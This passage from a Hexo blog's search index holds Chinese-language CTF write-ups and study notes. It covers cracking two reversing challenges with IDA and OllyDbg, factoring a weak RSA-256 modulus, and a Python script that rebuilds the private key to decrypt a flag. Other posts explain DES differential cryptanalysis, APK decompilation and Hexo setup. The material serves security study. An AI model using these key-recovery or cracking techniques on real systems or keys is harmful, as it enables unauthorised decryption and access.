rel="noopener">https://www.anquanke.com/post/id/150359#h2-24</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-3-31-上海嘉韦思杯wp-re</title>
      <link href="/passages/2019-3-31-%E4%B8%8A%E6%B5%B7%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AFwp-re/"/>
      <url>/passages/2019-3-31-%E4%B8%8A%E6%B5%B7%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AFwp-re/</url>
      
        <content type="html"><![CDATA[<h1 id="2019-3-31-上海嘉韦思杯wp-re"><a href="#2019-3-31-上海嘉韦思杯wp-re" class="headerlink" title="2019-3-31-上海嘉韦思杯wp-re"></a>2019-3-31-上海嘉韦思杯wp-re</h1><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>看是pe文件，打开ida 打开olldbg<br><img src="/images/2019jiaweisibei/2019-3-31-re1.png" alt="avatar"><br>Main函数看到strcmp，输入第一个密码r0b0RUlez!<br>才发现又要输入第二个密码，这个出乎我的意料<br>Olldbg动调的时候一层层地F2设断点<br><img src="/images/2019jiaweisibei/2019-3-31-re1-2.png" alt="avatar"><br>通过level1后会调用0x004015EA，在0x004015EA设断点，然后到0x004015ea的int 3之后断了思路</p><p>这时候回到IDA搜索scanf之类的输入函数，然后看到了<br><img src="/images/2019jiaweisibei/2019-3-31-re1-3.png" alt="avatar"><br>关键函数在sub_401547</p><p>因为if语句里要为1才会输出dword_40ADA4的祝贺语句，所以函数要返回0（！0=1）<br>所以<em>a1要等于</em>(a2^2)才不会return 1，*a2是40AD98地址所在指针指向的字符串<br>在od的内存中打开40AD98<br><img src="/images/2019jiaweisibei/2019-3-31-re1-4.png" alt="avatar"><br>找到0x40AD98所在地址的指针（指向0x28FDCC）指向的偏移</p><p><img src="/images/2019jiaweisibei/2019-3-31-re1-5.png" alt="avatar"><br>将u1nnf21g按位与2后得到w3lld0ne<br>最后比较坑的一点是两个flag片段之间要加_<br>所以最终flag：flag{r0b0RUlez!_w3lld0ne}</p><h2 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h2><p>这一题感觉比较坑，我的IDA有部分函数没办法转成伪代码，动调的时候才知道是从0x08048420开始程序<br><img src="/images/2019jiaweisibei/2019-3-31-re2-1.png" alt="avatar"></p><p>重点就三句<br><img src="/images/2019jiaweisibei/2019-3-31-re2-2.png" alt="avatar"><br>Jnz要进行跳转，执行下面的0x804848F,Incorrect！已经很明显是错误的了。<br>为了jnz跳转，就需要之前的test不等于0，因为test eax,eax相当于and eax，eax<br>所以想要标志位Z不为0，就只需要eax不为0，那样and eax，eax就不会为0<br>在32位系统中，eax是作为函数的返回值的，所以eax的值取决于sub_8048580函数的返回值，接下来重点分析该函数</p><p><img src="/images/2019jiaweisibei/2019-3-31-re2-3.png" alt="avatar"><br>这个函数很长，主要就是case 10-122，每次要嘛满足if return，要嘛continue继续下一次循环，函数的功能就是每次循环对比一位你输入的参数，接下来我们要找到return不为0的地方，经过每个return的挑选，我选中了case 107<br><img src="/images/2019jiaweisibei/2019-3-31-re2-4.png" alt="avatar"><br>挑选的依据在于v14在esp+37H的位置，在函数的开头有一个v5[(v3 + 64) % 128] = 1;<br>其中v5在esp+cH的位置，V3是我们输入的字符串每次循环指向的那一个字符<br>因为（0x37-0xC-64）%128=107，所以当我们输入107（也就是‘k’）字符的时候v14所在值就会置1，这里值得注意的是每轮循环都会memset，把所有v5之后的栈空间置0，所以每次循环，只会有一个参数等于1，所以不能通过多次循环来满足v14！=0的条件（因为没注意memset是在每轮循环中让我浪费了大量时间），然后就是让v2==12为true，这一点就是一点点逆推了，比如在上一轮中满足case 98，让v2=12，或者从v2=0顺推也行（v2就是我们输入的字符串的下标，根据v3 = <em>(_BYTE </em>)(a1 + v2);）<br>最后构造字符串链48,57,118,100,102,55,119,101, 102,105,106, 98 , 107<br>得到flag{09vdf7wefijbk}</p><h2 id="rsa256"><a href="#rsa256" class="headerlink" title="rsa256"></a>rsa256</h2><p>最后附加一个rsa<br><img src="/images/2019jiaweisibei/2019-3-31-rsa256.png" alt="avatar"><br>给了公钥文件和flag文件<br>公钥直接扔到<a href="http://tool.chacuo.net/cryptrsakeyparse" target="_blank" rel="noopener">http://tool.chacuo.net/cryptrsakeyparse</a><br>公私钥解密，得到公钥的N和E<br><img src="/images/2019jiaweisibei/2019-3-31-rsa256-2.png" alt="avatar"><br>之后把模数N转成10进制扔到<br><a href="http://www.factordb.com" target="_blank" rel="noopener">http://www.factordb.com</a> 大数分解<br><img src="/images/2019jiaweisibei/2019-3-31-rsa256-1.png" alt="avatar"></p><p>拿到q p后，放到脚本里生成私钥</p><h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="coding=utf-8"></a>coding=utf-8</h1><p>import math<br>import sys<br>from Crypto.PublicKey import RSA</p><p>keypair = RSA.generate(1024)</p><p>keypair.p = 273821108020968288372911424519201044333<br>keypair.q = 280385007186315115828483000867559983517<br>keypair.e = 65537</p><p>keypair.n = keypair.p <em> keypair.q<br>Qn = long((keypair.p-1) </em> (keypair.q-1))</p><p>i = 1<br>while (True):<br>    x = (Qn * i ) + 1<br>    if (x % keypair.e == 0):<br>        keypair.d = x / keypair.e<br>        break<br>    i += 1</p><p>private = open(‘private.pem’,’w’)<br>private.write(keypair.exportKey())<br>private.close()</p><p>该脚本来自<a href="https://blog.csdn.net/qq_31481187/article/details/70448108" target="_blank" rel="noopener">https://blog.csdn.net/qq_31481187/article/details/70448108</a></p><p>之后用命令openssl rsautl -decrypt -in flag.enc -inkey private.pem -out flag.dec得到flag文件flag.dec</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-3-28-DES一轮差分密码分析</title>
      <link href="/passages/2019-3-28-DES%E4%B8%80%E8%BD%AE%E5%B7%AE%E5%88%86%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90/"/>
      <url>/passages/2019-3-28-DES%E4%B8%80%E8%BD%AE%E5%B7%AE%E5%88%86%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="DES的差分分析攻击"><a href="#DES的差分分析攻击" class="headerlink" title="DES的差分分析攻击"></a>DES的差分分析攻击</h1><h2 id="差分密码分析介绍"><a href="#差分密码分析介绍" class="headerlink" title="差分密码分析介绍"></a>差分密码分析介绍</h2><p>差分密码分析是已知的攻击迭代密码（迭代一个简单的轮函数，比如DES，就是简单地根据F函数和密钥迭代N轮）最有效的方法之一，基本思想就是用过明文对的异或值对密文对的异或值的影响来还原密钥（也就是已知多对明文和密文，从而推测出密钥）。</p><h2 id="一轮DES的差分密码分析"><a href="#一轮DES的差分密码分析" class="headerlink" title="一轮DES的差分密码分析"></a>一轮DES的差分密码分析</h2><p>接下来用一轮的DES简单地演示一遍差分分析，附带python脚本</p><p>DES的密文是通过上一轮的R（32位），经过E-盒的扩充得到的E（48位），然后E与密钥经过PC-2置换的K（48位）异或后得到I，I经过分割后进入S盒，最终得到O，O经过P-盒置换得到P。（为了推理的简洁，之后的推论过程直接忽略E-盒置换和P-盒置换，因为这两个置换在差分分析的代码中加个逆置换就好了，所以下文中的E就是明文的右半部分，O就是密文的左半边部分）<br>从而得到以下公式<br>E⊕K=I<br>S（I）=O<br>之后我们还需要几个公式<br>就是E’=（E） ⊕ (E#)<br>(E⊕K)⊕（E#⊕K）=（E⊕E#）（K⊕K）=E’<br>(E⊕K)⊕（E#⊕K）=I⊕I#=I’=E’</p><p>其中E和E#就是随机的一对明文，E’就是两者的异或值，同理可以得到I’、O’，在知道一对明文和轮函数（也就是DES的详细加密过程）的情况下，我们就能得到一对密文，从而得到E’、O’，因为K在不同明文的加密过程中是相同的，所以E’=I’，在知道I’、O’的情况下，我们也就能根据S-盒差分对应表得到可能的两个输入I、I#、接着通过已知的E、E#和多个可能的I、I#异或得到可能的K值，最后通过多对明文得到多个K值得集合，它们的唯一交集就是真正的K。</p><p>这里的难点在于O’通过S盒逆查找得到I’是有多种情况的，因为S盒是6位输入变成4位输出，这就造成了缺失，所以我们需要一个差分对应表，差分对应表的详情可以参考我的python代码<br><a href="https://github.com/starsdestinations/DES-differential-cryptanalysis/blob/master/S%E7%9B%92%E5%B7%AE%E5%88%86%E5%80%BC%E5%AF%B9%E5%BA%94%E8%A1%A8python%E5%AE%9E%E7%8E%B0" target="_blank" rel="noopener">https://github.com/starsdestinations/DES-differential-cryptanalysis/blob/master/S%E7%9B%92%E5%B7%AE%E5%88%86%E5%80%BC%E5%AF%B9%E5%BA%94%E8%A1%A8python%E5%AE%9E%E7%8E%B0</a></p><p>我们可以得到一个I’（input）与O’（output）的差分对应表<br><img src="/images/2019-3-28-DES/2019-3-28-21-42.png" alt="avatar"><br>顺便一提的是一对输入I和I#顺序对调后得到的I’是一样的，所以差分对应表中每个项的值都是偶数</p><p>下面进行一次演示，只针对S1盒，所以我们选择两个6位明文<br>假设明文为E=0x13（01 0011） 和E#=0x27（10 0111）<br>得到E’=E ⊕ E# =0x13 ⊕ 0x27=0x34=I’<br>对两个明文进行加密（在不知道密钥的情况下，直接把两个明文放入黑盒DES中加密），得到两个密文，两个密文的O’值为D<br>根据I’ O’查找差分对应表，得到有4对（8种）可能的I值，经过计算得到这六个值为0x06、0x10、0x16、0x1c、0x22、0x24、0x28、0x32<br>把两个明文E和E#分别与这八个可能的I值异或：<br>0x06⊕0x01=0x07    0x06⊕0x35=0x33<br>0x10⊕0x01=0x11    0x10⊕0x35=0x25<br>0x16⊕0x01=0x17    0x16⊕0x35=0x23<br>0x1c⊕0x01=0x1d    0x1c⊕0x35=0x29<br>0x22⊕0x01=0x23    0x22⊕0x35=0x17<br>0x24⊕0x01=0x25    0x24⊕0x35=0x11<br>0x28⊕0x01=0x29    0x28⊕0x35=0x1d<br>0x32⊕0x01=0x33    0x32⊕0x35=0x07<br>将得到的16种可能的K作为一个集合{07，11，17，1d，23，25，29，33}</p><p>接着再选择一对明文，比如21、15，同样的顺序得到可能的K合集{00，14，17，20，23，34}<br>两个集合的交集{17，23}就是K可能取的值</p><p>通过多个明文对一次次的差分分析，最后我们会得到只有一个参数的交集，那个唯一参数就是K值</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-3-20-DES学习</title>
      <link href="/passages/2019-3-20-DES%E5%AD%A6%E4%B9%A0/"/>
      <url>/passages/2019-3-20-DES%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="密码学中DES学习"><a href="#密码学中DES学习" class="headerlink" title="密码学中DES学习"></a>密码学中DES学习</h1><h2 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h2><p>双射：既是单射又是满射的映射称为双射，亦称“一一映射”。<br>满射：值域任何元素都有至少有一个变量与之对应，那这个映射就叫做满射<br>单射：函数f被称为是单射时，对每一值域内的y，存在至多一个定义域内的x使得f(x) = y<br>双射的概念在书中介绍DES的函数f时出现</p><p>⊕异或，两边相同时为0，与0异或就是本身，对DES加解密的证明过程有帮助</p><h2 id="DES基础"><a href="#DES基础" class="headerlink" title="DES基础"></a>DES基础</h2><p><img src="/images/2019-3-20-DESlearning/2019-3-20-9-33.png" alt="avatar"><br><img src="/images/2019-3-20-DESlearning/2019-3-20-10-29.png" alt="avatar"><br><img src="/images/2019-3-20-DESlearning/2019-3-20-10-36.png" alt="avatar"><br>这是DES三个最重要的部分，在加解密的过程中，初始置换IP和PC-I是两个表格，比较特殊的是PC-I，PC-I只有56个表项，因为64位密钥实际上其中八的倍数位（初始是第一位）是前七位的奇校验，进行置换的时候会删掉八位校验码。</p><p><img src="/images/2019-3-20-DESlearning/2019-3-20-11-03.png" alt="avatar"><br><img src="/images/2019-3-20-DESlearning/2019-3-20-11-04.png" alt="avatar"><br>函数f：第一步是把32位的Ri根据E-盒进行扩充置换（这一步跟IP和PC-I差不多，只是置换表不一样而已），然后得到48位的结果（因为其中有16位会映射两个结果），之后和Ki（变换i轮后的密钥k）异或，得到的48位结果分成8组，每组都通过S-盒置换（8个S-盒都不一样），最后32位输出会进行一次P置换。</p><p><img src="/images/2019-3-20-DESlearning/2019-3-20-11-05.png" alt="avatar"><br><img src="/images/2019-3-20-DESlearning/2019-3-20-11-06.png" alt="avatar"><br>S-盒比较特殊，是一个4行*16列的查找表（每个项是一个4位二进制数），作为输入的每组的6位二进制数，头尾两位组成的数字作为行数，中间四位组成的数字作为列数（行列都以0为起始值），<br>比如输入1 0100 0，就是查找S-盒的10（头尾两位）行，0100列。<br>函数f中的S-盒引入了非线性，而P置换则引入了扩散，即让每一位明文对更多的密文产生影响，在DES中，16轮加密后每位密文都受到所有64位明文的影响。</p><p>最后是关于加解密为何只需要调换一下Ki的顺序（密钥变化加密的时候是左右两部分向左循环移位，其中1、2、9、16左移一位，其它轮移两位，解密时的Ki就是右移，其中第一轮不移位，2、9、16右移一位，其它轮两位），这里有一个证明公式，配合加解密的图就能看懂了（右上角的d代表解密）<br><img src="/images/2019-3-20-DESlearning/2019-3-20-11-12.png" alt="avatar"><br>⊕异或，两边相同时为0，与0异或就是本身，对没有数学基础的人配合这一点就能理解证明公式最重要的最后一步了</p><h2 id="《深入浅出密码学》第三章学习困惑"><a href="#《深入浅出密码学》第三章学习困惑" class="headerlink" title="《深入浅出密码学》第三章学习困惑"></a>《深入浅出密码学》第三章学习困惑</h2><p><img src="/images/2019-3-20-DESlearning/2019-3-20-10-13.png" alt="avatar"><br>这里有个矛盾之处，上部分说了是左右两部分移位，下面却说要嘛左部分移位，要嘛右部分移位，根据下面说的28次移位后密钥左右各28位的两部分恢复原样判断这里的要嘛应该是翻译错误。<br><img src="/images/2019-3-20-DESlearning/2019-3-20-10-20.png" alt="avatar"><br>这里的Ci和Di应该总共只有56位，感觉还是翻译错误</p><p>最后推荐《深入浅出密码学》这本书，挺适合基础薄弱的人看的，虽然部分数论证明过程还是挺难懂。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-3-14-Xman-teamfour题解</title>
      <link href="/passages/2019-3-14-Xman-teamfour%E9%A2%98%E8%A7%A3/"/>
      <url>/passages/2019-3-14-Xman-teamfour%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="Xman冬令营结营赛题目teamfour题解"><a href="#Xman冬令营结营赛题目teamfour题解" class="headerlink" title="Xman冬令营结营赛题目teamfour题解"></a>Xman冬令营结营赛题目teamfour题解</h1><h2 id="第一步：APK文件逆向"><a href="#第一步：APK文件逆向" class="headerlink" title="第一步：APK文件逆向"></a>第一步：APK文件逆向</h2><p>apk文件的逆向工具有非常多种<br>1、dex-tool+jd-gui的组合<br>先把dex-tool文件中的bin文件夹和d2j_invoke.bat、d2j-dex2jar.bat以及想要转化的classes.dex文件放到同一个文件夹，然后打开命令行cd到该文件夹或者右键使用git bash工具打开命令行，输入 ./d2j-dex2jar.bat ./classes.dex，就会生成一个jar文件，随后就能用jd-gui打开这个jar文件，浏览java代码了<br>2、jadx或者jeb<br>jadx和jeb的使用相对而言都很简单，jadx打开bin目录下的jadx-gui.bat，在弹出的窗口的左上角选择打开对应的apk文件就能浏览java代码了，jeb同样，但区别是jeb打开apk文件后出来的是smali代码，这时候需要右键把smali转化成java代码，这一点感觉跟ida差不多</p><p>有以上这些工具就能初步地进行安卓逆向分析了，当然只是静态分析smali代码，apk中的c语言编写的jni则需要用ida进行静态分析</p><h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p><img src="/images/1.png" alt="avatar"><br>这道题有一个坑，虽然在代码中看起来是要通过md5得到flag_one，然后通过des拿到flag_two，最后组合成flag，但实际上flag_one藏在res资源文件中的drawable文件内的图片内，用notepad打开文件搜索flag就能得到“This is only a half FLAG: AndroMan”<br>暂时到这，des加密实在看得头疼，手边没有root的手机没办法进行动态调试，手机未到的这两天先学习一下rsa和des加密。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-3-13-github+hexo搭建博客</title>
      <link href="/passages/2019-3-13-github-hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/passages/2019-3-13-github-hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="github-hexo搭建博客"><a href="#github-hexo搭建博客" class="headerlink" title="github+hexo搭建博客"></a>github+hexo搭建博客</h1><h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><p>创建github账号，新建项目,注意项目名一定要设置成以下格式：yourusername.github.io(其中yourusername是github的账号名)</p><h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>下载git和nodejs（两个下载过程一路默认就好）</p><h2 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h2><p>在电脑的某个位置创建一个文件，这个文件是用来存放hexo和本地网站的，之后在这个文件里鼠标右键选择git bash here（下载完git后右键就会多出这个选项）<br>输入 npm install -g hexo-cli 安装hexo，安装好后可以输入 hexo -v查看版本<br>随后初始化hexo，输入 hexo init myblog（myblog就是你的文件名）<br>这时候再输入 hexo g 和 hexo server，就可以打开浏览器输入localhost:4000,成功看到自己创建的本地网站</p><h2 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h2><p>接着输入git config –global user.name “yourname” 和 git config –global user.email “youremail”（这里的yourname和youremail是github的账号名和邮箱地址）<br>然后创建ssh，输入命令 ssh-keygen -t rsa -C “youremail”（之后一直回车）<br>ssh密钥创建完后根据提示在本地找到密钥文件，其中id_rsa是私钥，id_rsa.pub是公钥，要放到github上<br>在GitHub的setting中（不是项目的setting而是账号的setting），找到SSH keys的设置选项，把id_rsa.pub的内容复制上去</p><h2 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a>第五步</h2><p>这是最后一个步骤，在你创建的本地文件夹中，这时候应该有一个_config.yml文件，在这个文件的末尾修改成如下格式：<br>deploy:<br>  type: git<br>  repo: <a href="https://github.com/YourgithubName/YourgithubName.github.io.git" target="_blank" rel="noopener">https://github.com/YourgithubName/YourgithubName.github.io.git</a><br>  branch: master<br>其中YourggithubName记得改成自己的<br>接下来在之前的git bash 中输入<br>hexo clean<br>hexo g（生成本地静态页面，我的理解是把你在本地的修改适应到整个本地网站，比如你在\source_posts下创建一个md文件，输入hexo g后会自动在public\passages下生成对应名字的文件夹以及html页面）<br>hexo d（将本地网站的变动复制到远端github上）<br>然后你就能输入<a href="http://yourgithubname.github.io上看到自己搭建的网站了" target="_blank" rel="noopener">http://yourgithubname.github.io上看到自己搭建的网站了</a></p><h2 id="进阶技巧"><a href="#进阶技巧" class="headerlink" title="进阶技巧"></a>进阶技巧</h2><p>想变更主题就在/themes下用git bash输入命令 git clone <a href="http://themegithubaddress" target="_blank" rel="noopener">http://themegithubaddress</a> ，把hexo官网的主题文件clone到自己本地（每个主题都是一个github项目），记得不能在主题的github上选择下载zip，那样解压出来的主题是有问题的<br>然后在博客文件下的_config.yml（不是主题的那个_config.yml）中把theme字段后的默认主题名改成你clone下来的文件名（记得不是主题的名字，而是/theme下文件夹的名字）<br>之后的具体设置就要看相关主题的文档</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://zhuanlan.zhihu.com/p/44213627" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/44213627</a><br><a href="https://www.cnblogs.com/fengxiongZz/p/7707219.html" target="_blank" rel="noopener">https://www.cnblogs.com/fengxiongZz/p/7707219.html</a><br><a href="https://www.jianshu.com/p/f4cc5866946b" target="_blank" rel="noopener">https://www.jianshu.com/p/f4cc5866946b</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/passages/hello-world/"/>
      <url>/passages/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
